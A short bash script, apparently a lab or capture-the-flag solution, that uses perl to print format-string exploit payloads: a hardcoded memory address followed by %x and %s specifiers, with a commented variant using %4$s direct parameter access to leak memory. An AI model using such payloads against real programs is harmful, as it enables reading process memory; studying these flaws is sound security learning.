#!/bin/bash

# write address of the string first, then use %x to jump over non-important memory
perl -e 'print "\xc0\x85\x04\x080x%x%s";'

# alternatively we can use field specificer. Note that the "\" before "$" is very important.
# without "\", bash will treat "$s" as an environment variable instead of two characters.
#perl -e 'print "\xe0\x85\x04\x08%4\$s";'
